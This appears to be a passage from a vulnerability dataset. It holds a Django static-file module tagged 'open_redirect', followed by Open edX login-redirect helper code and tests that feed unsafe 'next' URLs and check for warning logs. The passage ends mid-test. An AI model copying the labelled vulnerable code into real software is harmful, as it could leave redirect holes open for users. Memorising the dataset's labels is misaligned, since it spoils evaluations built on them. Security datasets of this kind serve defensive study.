    <meta http-equiv=""Content-Language"" content=""en-us"" />
    <meta name=""robots"" content=""NONE,NOARCHIVE"" />
    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>
  </head>
  <body>
    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>
    <ul>
      {% if directory != ""/"" %}
      <li><a href=""../"">../</a></li>
      {% endif %}
      {% for f in file_list %}
      <li><a href=""{{ f|urlencode }}"">{{ f }}</a></li>
      {% endfor %}
    </ul>
  </body>
</html>
""""""
template_translatable = gettext_lazy(""Index of %(directory)s"")


def directory_index(path, fullpath):
    try:
        t = loader.select_template([
            'static/directory_index.html',
            'static/directory_index',
        ])
    except TemplateDoesNotExist:
        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)
    files = []
    for f in os.listdir(fullpath):
        if not f.startswith('.'):
            if os.path.isdir(os.path.join(fullpath, f)):
                f += '/'
            files.append(f)
    c = Context({
        'directory': path + '/',
        'file_list': files,
    })
    return HttpResponse(t.render(c))


def was_modified_since(header=None, mtime=0, size=0):
    """"""
    Was something modified since the user last downloaded it?

    header
      This is the value of the If-Modified-Since header.  If this is None,
      I'll just return True.

    mtime
      This is the modification time of the item we're talking about.

    size
      This is the size of the item we're talking about.
    """"""
    try:
        if header is None:
            raise ValueError
        matches = re.match(r""^([^;]+)(; length=([0-9]+))?$"", header,
                           re.IGNORECASE)
        header_mtime = parse_http_date(matches.group(1))
        header_len = matches.group(3)
        if header_len and int(header_len) != size:
            raise ValueError
        if int(mtime) > header_mtime:
            raise ValueError
    except (AttributeError, ValueError, OverflowError):
        return True
    return False
/n/n/n",1,open_redirect
18,38,43b55308a6467a5b8880bb40b71ec0821cb76398,"common/djangoapps/student/helpers.py/n/n""""""Helpers for the student app. """"""
import logging
import mimetypes
import urllib
import urlparse
from datetime import datetime

from django.conf import settings
from django.core.urlresolvers import NoReverseMatch, reverse
from django.utils import http
from oauth2_provider.models import AccessToken as dot_access_token
from oauth2_provider.models import RefreshToken as dot_refresh_token
from provider.oauth2.models import AccessToken as dop_access_token
from provider.oauth2.models import RefreshToken as dop_refresh_token
from pytz import UTC

import third_party_auth
from course_modes.models import CourseMode
from lms.djangoapps.verify_student.models import SoftwareSecurePhotoVerification, VerificationDeadline
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from openedx.core.djangoapps.theming.helpers import get_themes

# Enumeration of per-course verification statuses
# we display on the student dashboard.
VERIFY_STATUS_NEED_TO_VERIFY = ""verify_need_to_verify""
VERIFY_STATUS_SUBMITTED = ""verify_submitted""
VERIFY_STATUS_RESUBMITTED = ""re_verify_submitted""
VERIFY_STATUS_APPROVED = ""verify_approved""
VERIFY_STATUS_MISSED_DEADLINE = ""verify_missed_deadline""
VERIFY_STATUS_NEED_TO_REVERIFY = ""verify_need_to_reverify""

DISABLE_UNENROLL_CERT_STATES = [
    'generating',
    'ready',
]


log = logging.getLogger(__name__)


def check_verify_status_by_course(user, course_enrollments):
    """"""
    Determine the per-course verification statuses for a given user.

    The possible statuses are:
        * VERIFY_STATUS_NEED_TO_VERIFY: The student has not yet submitted photos for verification.
        * VERIFY_STATUS_SUBMITTED: The student has submitted photos for verification,
          but has have not yet been approved.
        * VERIFY_STATUS_RESUBMITTED: The student has re-submitted photos for re-verification while
          they still have an active but expiring ID verification
        * VERIFY_STATUS_APPROVED: The student has been successfully verified.
        * VERIFY_STATUS_MISSED_DEADLINE: The student did not submit photos within the course's deadline.
        * VERIFY_STATUS_NEED_TO_REVERIFY: The student has an active verification, but it is
            set to expire before the verification deadline for the course.

    It is is also possible that a course does NOT have a verification status if:
        * The user is not enrolled in a verified mode, meaning that the user didn't pay.
        * The course does not offer a verified mode.
        * The user submitted photos but an error occurred while verifying them.
        * The user submitted photos but the verification was denied.

    In the last two cases, we rely on messages in the sidebar rather than displaying
    messages for each course.

    Arguments:
        user (User): The currently logged-in user.
        course_enrollments (list[CourseEnrollment]): The courses the user is enrolled in.

    Returns:
        dict: Mapping of course keys verification status dictionaries.
            If no verification status is applicable to a course, it will not
            be included in the dictionary.
            The dictionaries have these keys:
                * status (str): One of the enumerated status codes.
                * days_until_deadline (int): Number of days until the verification deadline.
                * verification_good_until (str): Date string for the verification expiration date.

    """"""
    status_by_course = {}

    # Retrieve all verifications for the user, sorted in descending
    # order by submission datetime
    verifications = SoftwareSecurePhotoVerification.objects.filter(user=user)

    # Check whether the user has an active or pending verification attempt
    # To avoid another database hit, we re-use the queryset we have already retrieved.
    has_active_or_pending = SoftwareSecurePhotoVerification.user_has_valid_or_pending(
        user, queryset=verifications
    )

    # Retrieve expiration_datetime of most recent approved verification
    # To avoid another database hit, we re-use the queryset we have already retrieved.
    expiration_datetime = SoftwareSecurePhotoVerification.get_expiration_datetime(user, verifications)
    verification_expiring_soon = SoftwareSecurePhotoVerification.is_verification_expiring_soon(expiration_datetime)

    # Retrieve verification deadlines for the enrolled courses
    enrolled_course_keys = [enrollment.course_id for enrollment in course_enrollments]
    course_deadlines = VerificationDeadline.deadlines_for_courses(enrolled_course_keys)

    recent_verification_datetime = None

    for enrollment in course_enrollments:

        # If the user hasn't enrolled as verified, then the course
        # won't display state related to its verification status.
        if enrollment.mode in CourseMode.VERIFIED_MODES:

            # Retrieve the verification deadline associated with the course.
            # This could be None if the course doesn't have a deadline.
            deadline = course_deadlines.get(enrollment.course_id)

            relevant_verification = SoftwareSecurePhotoVerification.verification_for_datetime(deadline, verifications)

            # Picking the max verification datetime on each iteration only with approved status
            if relevant_verification is not None and relevant_verification.status == ""approved"":
                recent_verification_datetime = max(
                    recent_verification_datetime if recent_verification_datetime is not None
                    else relevant_verification.expiration_datetime,
                    relevant_verification.expiration_datetime
                )

            # By default, don't show any status related to verification
            status = None

            # Check whether the user was approved or is awaiting approval
            if relevant_verification is not None:
                if relevant_verification.status == ""approved"":
                    if verification_expiring_soon:
                        status = VERIFY_STATUS_NEED_TO_REVERIFY
                    else:
                        status = VERIFY_STATUS_APPROVED
                elif relevant_verification.status == ""submitted"":
                    if verification_expiring_soon:
                        status = VERIFY_STATUS_RESUBMITTED
                    else:
                        status = VERIFY_STATUS_SUBMITTED

            # If the user didn't submit at all, then tell them they need to verify
            # If the deadline has already passed, then tell them they missed it.
            # If they submitted but something went wrong (error or denied),
            # then don't show any messaging next to the course, since we already
            # show messages related to this on the left sidebar.
            submitted = (
                relevant_verification is not None and
                relevant_verification.status not in [""created"", ""ready""]
            )
            if status is None and not submitted:
                if deadline is None or deadline > datetime.now(UTC):
                    if SoftwareSecurePhotoVerification.user_is_verified(user):
                        if verification_expiring_soon:
                            # The user has an active verification, but the verification
                            # is set to expire within ""EXPIRING_SOON_WINDOW"" days (default is 4 weeks).
                            # Tell the student to reverify.
                            status = VERIFY_STATUS_NEED_TO_REVERIFY
                    else:
                        status = VERIFY_STATUS_NEED_TO_VERIFY
                else:
                    # If a user currently has an active or pending verification,
                    # then they may have submitted an additional attempt after
                    # the verification deadline passed.  This can occur,
                    # for example, when the support team asks a student
                    # to reverify after the deadline so they can receive
                    # a verified certificate.
                    # In this case, we still want to show them as ""verified""
                    # on the dashboard.
                    if has_active_or_pending:
                        status = VERIFY_STATUS_APPROVED

                    # Otherwise, the student missed the deadline, so show
                    # them as ""honor"" (the kind of certificate they will receive).
                    else:
                        status = VERIFY_STATUS_MISSED_DEADLINE

            # Set the status for the course only if we're displaying some kind of message
            # Otherwise, leave the course out of the dictionary.
            if status is not None:
                days_until_deadline = None

                now = datetime.now(UTC)
                if deadline is not None and deadline > now:
                    days_until_deadline = (deadline - now).days

                status_by_course[enrollment.course_id] = {
                    'status': status,
                    'days_until_deadline': days_until_deadline
                }

    if recent_verification_datetime:
        for key, value in status_by_course.iteritems():  # pylint: disable=unused-variable
            status_by_course[key]['verification_good_until'] = recent_verification_datetime.strftime(""%m/%d/%Y"")

    return status_by_course


def auth_pipeline_urls(auth_entry, redirect_url=None):
    """"""Retrieve URLs for each enabled third-party auth provider.

    These URLs are used on the ""sign up"" and ""sign in"" buttons
    on the login/registration forms to allow users to begin
    authentication with a third-party provider.

    Optionally, we can redirect the user to an arbitrary
    url after auth completes successfully.  We use this
    to redirect the user to a page that required login,
    or to send users to the payment flow when enrolling
    in a course.

    Args:
        auth_entry (string): Either `pipeline.AUTH_ENTRY_LOGIN` or `pipeline.AUTH_ENTRY_REGISTER`

    Keyword Args:
        redirect_url (unicode): If provided, send users to this URL
            after they successfully authenticate.

    Returns:
        dict mapping provider IDs to URLs

    """"""
    if not third_party_auth.is_enabled():
        return {}

    return {
        provider.provider_id: third_party_auth.pipeline.get_login_url(
            provider.provider_id, auth_entry, redirect_url=redirect_url
        ) for provider in third_party_auth.provider.Registry.displayed_for_login()
    }


# Query string parameters that can be passed to the ""finish_auth"" view to manage
# things like auto-enrollment.
POST_AUTH_PARAMS = ('course_id', 'enrollment_action', 'course_mode', 'email_opt_in', 'purchase_workflow')


def get_next_url_for_login_page(request):
    """"""
    Determine the URL to redirect to following login/registration/third_party_auth

    The user is currently on a login or registration page.
    If 'course_id' is set, or other POST_AUTH_PARAMS, we will need to send the user to the
    /account/finish_auth/ view following login, which will take care of auto-enrollment in
    the specified course.

    Otherwise, we go to the ?next= query param or to the dashboard if nothing else is
    specified.

    If THIRD_PARTY_AUTH_HINT is set, then `tpa_hint=<hint>` is added as a query parameter.
    """"""
    redirect_to = get_redirect_to(request)
    if not redirect_to:
        try:
            redirect_to = reverse('dashboard')
        except NoReverseMatch:
            redirect_to = reverse('home')

    if any(param in request.GET for param in POST_AUTH_PARAMS):
        # Before we redirect to next/dashboard, we need to handle auto-enrollment:
        params = [(param, request.GET[param]) for param in POST_AUTH_PARAMS if param in request.GET]
        params.append(('next', redirect_to))  # After auto-enrollment, user will be sent to payment page or to this URL
        redirect_to = '{}?{}'.format(reverse('finish_auth'), urllib.urlencode(params))
        # Note: if we are resuming a third party auth pipeline, then the next URL will already
        # be saved in the session as part of the pipeline state. That URL will take priority
        # over this one.

    # Append a tpa_hint query parameter, if one is configured
    tpa_hint = configuration_helpers.get_value(
        ""THIRD_PARTY_AUTH_HINT"",
        settings.FEATURES.get(""THIRD_PARTY_AUTH_HINT"", '')
    )
    if tpa_hint:
        # Don't add tpa_hint if we're already in the TPA pipeline (prevent infinite loop),
        # and don't overwrite any existing tpa_hint params (allow tpa_hint override).
        running_pipeline = third_party_auth.pipeline.get(request)
        (scheme, netloc, path, query, fragment) = list(urlparse.urlsplit(redirect_to))
        if not running_pipeline and 'tpa_hint' not in query:
            params = urlparse.parse_qs(query)
            params['tpa_hint'] = [tpa_hint]
            query = urllib.urlencode(params, doseq=True)
            redirect_to = urlparse.urlunsplit((scheme, netloc, path, query, fragment))

    return redirect_to


def get_redirect_to(request):
    """"""
    Determine the redirect url and return if safe
    :argument
        request: request object

    :returns: redirect url if safe else None
    """"""
    redirect_to = request.GET.get('next')
    header_accept = request.META.get('HTTP_ACCEPT', '')

    # If we get a redirect parameter, make sure it's safe i.e. not redirecting outside our domain.
    # Also make sure that it is not redirecting to a static asset and redirected page is web page
    # not a static file. As allowing assets to be pointed to by ""next"" allows 3rd party sites to
    # get information about a user on edx.org. In any such case drop the parameter.
    if redirect_to:
        mime_type, _ = mimetypes.guess_type(redirect_to, strict=False)
        if not http.is_safe_url(redirect_to):
            log.warning(
                u'Unsafe redirect parameter detected after login page: %(redirect_to)r',
                {""redirect_to"": redirect_to}
            )
            redirect_to = None
        elif 'text/html' not in header_accept:
            log.warning(
                u'Redirect to non html content %(content_type)r detected from %(user_agent)r'
                u' after login page: %(redirect_to)r',
                {
                    ""redirect_to"": redirect_to, ""content_type"": header_accept,
                    ""user_agent"": request.META.get('HTTP_USER_AGENT', '')
                }
            )
            redirect_to = None
        elif mime_type:
            log.warning(
                u'Redirect to url path with specified filed type %(mime_type)r not allowed: %(redirect_to)r',
                {""redirect_to"": redirect_to, ""mime_type"": mime_type}
            )
            redirect_to = None
        elif settings.STATIC_URL in redirect_to:
            log.warning(
                u'Redirect to static content detected after login page: %(redirect_to)r',
                {""redirect_to"": redirect_to}
            )
            redirect_to = None
        else:
            themes = get_themes()
            for theme in themes:
                if theme.theme_dir_name in redirect_to:
                    log.warning(
                        u'Redirect to theme content detected after login page: %(redirect_to)r',
                        {""redirect_to"": redirect_to}
                    )
                    redirect_to = None
                    break

    return redirect_to


def destroy_oauth_tokens(user):
    """"""
    Destroys ALL OAuth access and refresh tokens for the given user.
    """"""
    dop_access_token.objects.filter(user=user.id).delete()
    dop_refresh_token.objects.filter(user=user.id).delete()
    dot_access_token.objects.filter(user=user.id).delete()
    dot_refresh_token.objects.filter(user=user.id).delete()
/n/n/ncommon/djangoapps/student/tests/test_helpers.py/n/n"""""" Test Student helpers """"""

import logging

import ddt
from django.conf import settings
from django.contrib.sessions.middleware import SessionMiddleware
from django.core.urlresolvers import reverse
from django.test import TestCase
from django.test.client import RequestFactory
from django.test.utils import override_settings
from mock import patch
from testfixtures import LogCapture

from student.helpers import get_next_url_for_login_page
from openedx.core.djangoapps.site_configuration.tests.test_util import with_site_configuration_context

LOGGER_NAME = ""student.helpers""


@ddt.ddt
class TestLoginHelper(TestCase):
    """"""Test login helper methods.""""""
    static_url = settings.STATIC_URL

    def setUp(self):
        super(TestLoginHelper, self).setUp()
        self.request = RequestFactory()

    @staticmethod
    def _add_session(request):
        """"""Annotate the request object with a session""""""
        middleware = SessionMiddleware()
        middleware.process_request(request)
        request.session.save()

    @ddt.data(
        (""https://www.amazon.com"", ""text/html"", None,
         ""Unsafe redirect parameter detected after login page: u'https://www.amazon.com'""),
        (""favicon.ico"", ""image/*"", ""test/agent"",
         ""Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'favicon.ico'""),
        (""https://www.test.com/test.jpg"", ""image/*"", None,
         ""Unsafe redirect parameter detected after login page: u'https://www.test.com/test.jpg'""),
        (static_url + ""dummy.png"", ""image/*"", ""test/agent"",
         ""Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'"" + static_url +
         ""dummy.png"" + ""'""),
        (""test.png"", ""text/html"", None,
         ""Redirect to url path with specified filed type 'image/png' not allowed: u'test.png'""),
        (static_url + ""dummy.png"", ""text/html"", None,
         ""Redirect to url path with specified filed type 'image/png' not allowed: u'"" + static_url + ""dummy.png"" + ""'""),
    )
    @ddt.unpack
    def test_unsafe_next(self, unsafe_url, http_accept, user_agent, expected_log):
        """""" Test unsafe next parameter """"""
        with LogCapture(LOGGER_NAME, level=logging.WARNING) as logger:
            req = self.request.get(reverse(""login"") + ""?next={url}"".format(url=unsafe_url))
            req.META[""HTTP_ACCEPT""] = http_accept  # pylint: disable=no-member
            req.META[""HTTP_USER_AGENT""] = user_agent  # pylint: disable=no-member
            get_next_url_for_login_page(req)
            logger.check(
                (LOGGER_NAME, ""WARNING"", expected_log)
            )

    def test_safe_next(self):
        """""" Test safe next parameter """"""
        req = self.request.get(reverse(""login"") + ""?next={url}"".format(url=""/dashboard""))
        req.META[""HTTP_ACCEPT""] = ""text/html""  # pylint: disable=no-member
        next_page = get_next_url_for_login_page(req)
        self.assertEqual(next_page, u'/dashboard')

    @patch('student.helpers.third_party_auth.pipeline.get')
    @ddt.data(
        # Test requests outside the TPA pipeline - tpa_hint should be added.
        (None, '/dashboard', '/dashboard', False),
        ('', '/dashboard', '/dashboard', False),
        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),
        ('saml-idp', '/dashboard', '/dashboard?tpa_hint=saml-idp', False),
        # THIRD_PARTY_AUTH_HINT can be overridden via the query string
        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),

        # Test requests inside the TPA pipeline - tpa_hint should not be added, preventing infinite loop.
        (None, '/dashboard', '/dashboard', True),
        ('', '/dashboard', '/dashboard', True),
        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),
        ('saml-idp', '/dashboard', '/dashboard', True),
        # OK to leave tpa_hint overrides in place.
        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),
    )
    @ddt.unpack
    def test_third_party_auth_hint(self, tpa_hint, next_url, expected_url, running_pipeline, mock_running_pipeline):
        mock_running_pipeline.return_value = running_pipeline

        def validate_login():
            req = self.request.get(reverse(""login"") + ""?next={url}"".format(url=next_url))
            req.META[""HTTP_ACCEPT""] = ""text/html""  # pylint: disable=no-member
            self._add_session(req)
            next_page = get_next_url_for_login_page(req)
            self.assertEqual(next_page, expected_url)

        with override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT=tpa_hint)):
            validate_login()

        with with_site_configuration_context(configuration=dict(THIRD_PARTY_AUTH_HINT=tpa_hint)):
            validate_login()
/n/n/nlms/djangoapps/student_account/test/test_views.py/n/n# -*- coding: utf-8 -*-
"""""" Tests for student account views. """"""

import logging
import re
from unittest import skipUnless
from urllib import urlencode

import ddt
import mock
from django.conf import settings
from django.contrib import messages
from django.contrib.auth import get_user_model
from django.contrib.messages.middleware import MessageMiddleware
from django.core import mail
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.urlresolvers import reverse
from django.http import HttpRequest
from django.test import TestCase
from django.test.utils import override_settings
from edx_oauth2_provider.tests.factories import AccessTokenFactory, ClientFactory, RefreshTokenFactory
from edx_rest_api_client import exceptions
from nose.plugins.attrib import attr
from oauth2_provider.models import AccessToken as dot_access_token
from oauth2_provider.models import RefreshToken as dot_refresh_token
from provider.oauth2.models import AccessToken as dop_access_token
from provider.oauth2.models import RefreshToken as dop_refresh_token
from testfixtures import LogCapture

from commerce.models import CommerceConfiguration
from commerce.tests import factories
from commerce.tests.mocks import mock_get_orders
from course_modes.models import CourseMode
from edxmako.shortcuts import render_to_response
from openedx.core.djangoapps.oauth_dispatch.tests import factories as dot_factories
from openedx.core.djangoapps.programs.tests.mixins import ProgramsApiConfigMixin
from openedx.core.djangoapps.site_configuration.tests.mixins import SiteMixin
from openedx.core.djangoapps.theming.tests.test_util import with_comprehensive_theme_context
from openedx.core.djangoapps.user_api.accounts import EMAIL_MAX_LENGTH
from openedx.core.djangoapps.user_api.accounts.api import activate_account, create_account
from openedx.core.djangolib.js_utils import dump_js_escaped_json
from openedx.core.djangolib.testing.utils import CacheIsolationTestCase
from student.tests.factories import UserFactory
from student_account.views import account_settings_context, get_user_orders
from third_party_auth.tests.testutil import ThirdPartyAuthTestMixin, simulate_running_pipeline
from util.testing import UrlResetMixin
from xmodule.modulestore.tests.django_utils import ModuleStoreTestCase

LOGGER_NAME = 'audit'
User = get_user_model()  # pylint:disable=invalid-name


@ddt.ddt
class StudentAccountUpdateTest(CacheIsolationTestCase, UrlResetMixin):
    """""" Tests for the student account views that update the user's account information. """"""

    USERNAME = u""heisenberg""
    ALTERNATE_USERNAME = u""walt""
    OLD_PASSWORD = u""ḅḷüëṡḳÿ""
    NEW_PASSWORD = u""🄱🄸🄶🄱🄻🅄🄴""
    OLD_EMAIL = u""walter@graymattertech.com""
    NEW_EMAIL = u""walt@savewalterwhite.com""

    INVALID_ATTEMPTS = 100

    INVALID_EMAILS = [
        None,
        u"""",
        u""a"",
        ""no_domain"",
        ""no+domain"",
        ""@"",
        ""@domain.com"",
        ""test@no_extension"",

        # Long email -- subtract the length of the @domain
        # except for one character (so we exceed the max length limit)
        u""{user}@example.com"".format(
            user=(u'e' * (EMAIL_MAX_LENGTH - 11))
        )
    ]

    INVALID_KEY = u""123abc""

    URLCONF_MODULES = ['student_accounts.urls']

    ENABLED_CACHES = ['default']

    def setUp(self):
        super(StudentAccountUpdateTest, self).setUp()

        # Create/activate a new account
        activation_key = create_account(self.USERNAME, self.OLD_PASSWORD, self.OLD_EMAIL)
        activate_account(activation_key)

        # Login
        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)
        self.assertTrue(result)

    @skipUnless(settings.ROOT_URLCONF == 'lms.urls', 'Test only valid in LMS')
    def test_password_change(self):
        # Request a password change while logged in, simulating
        # use of the password reset link from the account page
        response = self._change_password()
        self.assertEqual(response.status_code, 200)

        # Check that an email was sent
        self.assertEqual(len(mail.outbox), 1)

        # Retrieve the activation link from the email body
        email_body = mail.outbox[0].body
        result = re.search(r'(?P<url>https?://[^\s]+)', email_body)
        self.assertIsNot(result, None)
        activation_link = result.group('url')

        # Visit the activation link
        response = self.client.get(activation_link)
        self.assertEqual(response.status_code, 200)

        # Submit a new password and follow the redirect to the success page
        response = self.client.post(
            activation_link,
            # These keys are from the form on the current password reset confirmation page.
            {'new_password1': self.NEW_PASSWORD, 'new_password2': self.NEW_PASSWORD},
            follow=True
        )
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, ""Your password has been reset."")

        # Log the user out to clear session data
        self.client.logout()

        # Verify that the new password can be used to log in
        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)
        self.assertTrue(result)

        # Try reusing the activation link to change the password again
        # Visit the activation link again.
        response = self.client.get(activation_link)
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, ""This password reset link is invalid. It may have been used already."")

        self.client.logout()

        # Verify that the old password cannot be used to log in
        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)
        self.assertFalse(result)

        # Verify that the new password continues to be valid
        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)
        self.assertTrue(result)

    @ddt.data(True, False)
    def test_password_change_logged_out(self, send_email):
        # Log the user out
        self.client.logout()

        # Request a password change while logged out, simulating
        # use of the password reset link from the login page
        if send_email:
            response = self._change_password(email=self.OLD_EMAIL)
            self.assertEqual(response.status_code, 200)
        else:
            # Don't send an email in the POST data, simulating
            # its (potentially accidental) omission in the POST
            # data sent from the login page
            response = self._change_password()
            self.assertEqual(response.status_code, 400)

    def test_access_token_invalidation_logged_out(self):
        self.client.logout()
        user = User.objects.get(email=self.OLD_EMAIL)
        self._create_dop_tokens(user)
        self._create_dot_tokens(user)
        response = self._change_password(email=self.OLD_EMAIL)
        self.assertEqual(response.status_code, 200)
        self.assert_access_token_destroyed(user)

    def test_access_token_invalidation_logged_in(self):
        user = User.objects.get(email=self.OLD_EMAIL)
        self._create_dop_tokens(user)
        self._create_dot_tokens(user)
        response = self._change_password()
        self.assertEqual(response.status_code, 200)
        self.assert_access_token_destroyed(user)

    def test_password_change_inactive_user(self):
        # Log out the user created during test setup
        self.client.logout()

        # Create a second user, but do not activate it
        create_account(self.ALTERNATE_USERNAME, self.OLD_PASSWORD, self.NEW_EMAIL)

        # Send the view the email address tied to the inactive user
        response = self._change_password(email=self.NEW_EMAIL)

        # Expect that the activation email is still sent,
        # since the user may have lost the original activation email.
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(mail.outbox), 1)

    def test_password_change_no_user(self):
        # Log out the user created during test setup
        self.client.logout()

        with LogCapture(LOGGER_NAME, level=logging.INFO) as logger:
            # Send the view an email address not tied to any user
            response = self._change_password(email=self.NEW_EMAIL)
            self.assertEqual(response.status_code, 200)
            logger.check((LOGGER_NAME, 'INFO', 'Invalid password reset attempt'))

    def test_password_change_rate_limited(self):
        # Log out the user created during test setup, to prevent the view from
        # selecting the logged-in user's email address over the email provided
        # in the POST data
        self.client.logout()

        # Make many consecutive bad requests in an attempt to trigger the rate limiter
        for __ in xrange(self.INVALID_ATTEMPTS):
            self._change_password(email=self.NEW_EMAIL)

        response = self._change_password(email=self.NEW_EMAIL)
        self.assertEqual(response.status_code, 403)

    @ddt.data(
        ('post', 'password_change_request', []),
    )
    @ddt.unpack
    def test_require_http_method(self, correct_method, url_name, args):
        wrong_methods = {'get', 'put', 'post', 'head', 'options', 'delete'} - {correct_method}
        url = reverse(url_name, args=args)

        for method in wrong_methods:
            response = getattr(self.client, method)(url)
            self.assertEqual(response.status_code, 405)

    def _change_password(self, email=None):
        """"""Request to change the user's password. """"""
        data = {}

        if email:
            data['email'] = email

        return self.client.post(path=reverse('password_change_request'), data=data)

    def _create_dop_tokens(self, user=None):
        """"""Create dop access token for given user if user provided else for default user.""""""
        if not user:
            user = User.objects.get(email=self.OLD_EMAIL)

        client = ClientFactory()
        access_token = AccessTokenFactory(user=user, client=client)
        RefreshTokenFactory(user=user, client=client, access_token=access_token)

    def _create_dot_tokens(self, user=None):
        """"""Create dop access token for given user if user provided else for default user.""""""
        if not user:
            user = User.objects.get(email=self.OLD_EMAIL)

        application = dot_factories.ApplicationFactory(user=user)
        access_token = dot_factories.AccessTokenFactory(user=user, application=application)
        dot_factories.RefreshTokenFactory(user=user, application=application, access_token=access_token)

    def assert_access_token_destroyed(self, user):
        """"""Assert all access tokens are destroyed.""""""
        self.assertFalse(dot_access_token.objects.filter(user=user).exists())
        self.assertFalse(dot_refresh_token.objects.filter(user=user).exists())
        self.assertFalse(dop_access_token.objects.filter(user=user).exists())
        self.assertFalse(dop_refresh_token.objects.filter(user=user).exists())


@attr(shard=3)
@ddt.ddt
class StudentAccountLoginAndRegistrationTest(ThirdPartyAuthTestMixin, UrlResetMixin, ModuleStoreTestCase):
    """""" Tests for the student account views that update the user's account information. """"""

    USERNAME = ""bob""
    EMAIL = ""bob@example.com""
    PASSWORD = ""password""

    URLCONF_MODULES = ['openedx.core.djangoapps.embargo']

    @mock.patch.dict(settings.FEATURES, {'EMBARGO': True})
    def setUp(self):
        super(StudentAccountLoginAndRegistrationTest, self).setUp()

        # Several third party auth providers are created for these tests:
        self.google_provider = self.configure_google_provider(enabled=True, visible=True)
        self.configure_facebook_provider(enabled=True, visible=True)
        self.configure_dummy_provider(
            visible=True,
            enabled=True,
            icon_class='',
            icon_image=SimpleUploadedFile('icon.svg', '<svg><rect width=""50"" height=""100""/></svg>'),
        )
        self.hidden_enabled_provider = self.configure_linkedin_provider(
            visible=False,
            enabled=True,
        )
        self.hidden_disabled_provider = self.configure_azure_ad_provider()

    @ddt.data(
        (""signin_user"", ""login""),
        (""register_user"", ""register""),
    )
    @ddt.unpack
    def test_login_and_registration_form(self, url_name, initial_mode):
        response = self.client.get(reverse(url_name))
        expected_data = '""initial_mode"": ""{mode}""'.format(mode=initial_mode)
        self.assertContains(response, expected_data)

    @ddt.data(""signin_user"", ""register_user"")
    def test_login_and_registration_form_already_authenticated(self, url_name):
        # Create/activate a new account and log in
        activation_key = create_account(self.USERNAME, self.PASSWORD, self.EMAIL)
        activate_account(activation_key)
        result = self.client.login(username=self.USERNAME, password=self.PASSWORD)
        self.assertTrue(result)

        # Verify that we're redirected to the dashboard
        response = self.client.get(reverse(url_name))
        self.assertRedirects(response, reverse(""dashboard""))

    @ddt.data(
        (None, ""signin_user""),
        (None, ""register_user""),
        (""edx.org"", ""signin_user""),
        (""edx.org"", ""register_user""),
    )
    @ddt.unpack
    def test_login_and_registration_form_signin_not_preserves_params(self, theme, url_name):
        params = [
            ('course_id', 'edX/DemoX/Demo_Course'),
            ('enrollment_action', 'enroll'),
        ]

        # The response should not have a ""Sign In"" button with the URL
        # that preserves the querystring params
        with with_comprehensive_theme_context(theme):
            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        expected_url = '/login?{}'.format(self._finish_auth_url_param(params + [('next', '/dashboard')]))
        self.assertNotContains(response, expected_url)

        # Add additional parameters:
        params = [
            ('course_id', 'edX/DemoX/Demo_Course'),
            ('enrollment_action', 'enroll'),
            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),
            ('email_opt_in', 'true'),
            ('next', '/custom/final/destination')
        ]

        # Verify that this parameter is also preserved
        with with_comprehensive_theme_context(theme):
            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        expected_url = '/login?{}'.format(self._finish_auth_url_param(params))
        self.assertNotContains(response, expected_url)

    @mock.patch.dict(settings.FEATURES, {""ENABLE_THIRD_PARTY_AUTH"": False})
    @ddt.data(""signin_user"", ""register_user"")
    def test_third_party_auth_disabled(self, url_name):
        response = self.client.get(reverse(url_name))
        self._assert_third_party_auth_data(response, None, None, [], None)

    @mock.patch('student_account.views.enterprise_customer_for_request')
    @ddt.data(
        (""signin_user"", None, None, None),
        (""register_user"", None, None, None),
        (""signin_user"", ""google-oauth2"", ""Google"", None),
        (""register_user"", ""google-oauth2"", ""Google"", None),
        (""signin_user"", ""facebook"", ""Facebook"", None),
        (""register_user"", ""facebook"", ""Facebook"", None),
        (""signin_user"", ""dummy"", ""Dummy"", None),
        (""register_user"", ""dummy"", ""Dummy"", None),
        (
            ""signin_user"",
            ""google-oauth2"",
            ""Google"",
            {
                'name': 'FakeName',
                'logo': 'https://host.com/logo.jpg',
                'welcome_msg': 'No message'
            }
        )
    )
    @ddt.unpack
    def test_third_party_auth(
            self,
            url_name,
            current_backend,
            current_provider,
            expected_enterprise_customer_mock_attrs,
            enterprise_customer_mock
    ):
        params = [
            ('course_id', 'course-v1:Org+Course+Run'),
            ('enrollment_action', 'enroll'),
            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),
            ('email_opt_in', 'true'),
            ('next', '/custom/final/destination'),
        ]

        if expected_enterprise_customer_mock_attrs:
            expected_ec = mock.MagicMock(
                branding_configuration=mock.MagicMock(
                    logo=mock.MagicMock(
                        url=expected_enterprise_customer_mock_attrs['logo']
                    ),
                    welcome_message=expected_enterprise_customer_mock_attrs['welcome_msg']
                )
            )
            expected_ec.name = expected_enterprise_customer_mock_attrs['name']
        else:
            expected_ec = None

        enterprise_customer_mock.return_value = expected_ec

        # Simulate a running pipeline
        if current_backend is not None:
            pipeline_target = ""student_account.views.third_party_auth.pipeline""
            with simulate_running_pipeline(pipeline_target, current_backend):
